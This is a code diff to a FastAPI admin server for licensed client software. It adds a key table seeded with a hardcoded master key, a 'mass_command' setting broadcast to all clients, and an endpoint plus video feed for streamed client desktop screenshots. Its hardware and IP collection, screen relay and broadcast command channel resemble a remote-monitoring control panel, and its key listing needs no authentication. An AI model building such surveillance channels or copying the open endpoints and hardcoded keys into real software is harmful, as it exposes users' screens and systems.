@@ -49,15 +49,29 @@ def init_db():
             value TEXT
         )
     """)
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS keys (
+            key_code TEXT PRIMARY KEY,
+            note TEXT,
+            expiry TEXT,
+            status TEXT DEFAULT 'Aktiv'
+        )
+    """)
     
     defaults = {
         "stream_fps": "30",
         "stream_quality": "75",
-        "stream_res": "1080p"
+        "stream_res": "1080p",
+        "mass_command": "",
+        "min_version": "1.0.0"
     }
     for k, v in defaults.items():
         cursor.execute("INSERT OR IGNORE INTO global_settings (key, value) VALUES (?, ?)", (k, v))
         
+    cursor.execute("""
+        INSERT OR IGNORE INTO keys (key_code, note, expiry, status)
+        VALUES ('ASR-9812-PAUL', 'Master Standard Key', '2026-12-31', 'Aktiv')
+    """)
     conn.commit()
     conn.close()
 
@@ -78,6 +92,10 @@ class ClientData(BaseModel):
     expiry: str = "Lifetime"
     fps: int = 0
     frame_b64: str = ""
+
+class FrameData(BaseModel):
+    desktop: str
+    frame_b64: str
 
 @app.get("/", response_class=HTMLResponse)
 def serve_admin():
@@ -116,6 +134,32 @@ def get_users():
     conn.close()
     return [dict(row) for row in rows]
 
+@app.get("/api/stats")
+def get_stats():
+    conn = sqlite3.connect(DB_FILE)
+    cursor = conn.cursor()
+    cursor.execute("SELECT COUNT(*) FROM clients")
+    active_clients = cursor.fetchone()[0]
+    cursor.execute("SELECT COUNT(*) FROM keys")
+    total_keys = cursor.fetchone()[0]
+    conn.close()
+    return {
+        "active_clients": active_clients,
+        "open_tickets": 0,
+        "total_keys": total_keys,
+        "total_bans": 0
+    }
+
+@app.get("/api/keys")
+def get_keys():
+    conn = sqlite3.connect(DB_FILE)
+    conn.row_factory = sqlite3.Row
+    cursor = conn.cursor()
+    cursor.execute("SELECT * FROM keys")
+    rows = cursor.fetchall()
+    conn.close()
+    return [dict(row) for row in rows]
+
 @app.post("/api/client/heartbeat")
 def client_heartbeat(data: ClientData):
     conn = sqlite3.connect(DB_FILE)
@@ -139,12 +183,6 @@ def client_heartbeat(data: ClientData):
         last_seen=CURRENT_TIMESTAMP
     """, (data.desktop, data.custom_name, data.hwid, data.ip, data.cpu, data.gpu, data.motherboard, data.ram, data.os_build, data.game, data.license_key, data.expiry, data.fps))
     conn.commit()
-    
-    if data.frame_b64:
-        try:
-            active_streams[data.desktop] = base64.b64decode(data.frame_b64)
-        except:
-            pass
 
     cursor.execute("SELECT key, value FROM global_settings")
     settings_rows = cursor.fetchall()
@@ -152,6 +190,15 @@ def client_heartbeat(data: ClientData):
     conn.close()
     
     return {"status": "success", "settings": global_cfg}
+
+@app.post("/api/client/frame")
+def client_frame(data: FrameData):
+    if data.frame_b64:
+        try:
+            active_streams[data.desktop] = base64.b64decode(data.frame_b64)
+        except:
+            pass
+    return {"status": "success"}
 
 @app.get("/video_feed")
 def video_feed(user: str):
@@ -166,7 +213,7 @@ def video_feed(user: str):
                 _, encoded = cv2.imencode('.jpg', img)
                 yield (b'--frame\r\n'
                        b'Content-Type: image/jpeg\r\n\r\n' + bytearray(encoded) + b'\r\n')
-            time.sleep(0.05)
+            time.sleep(0.03)
     return StreamingResponse(generate_stream(), media_type="multipart/x-mixed-replace; boundary=frame")
 
 @app.post("/verify")
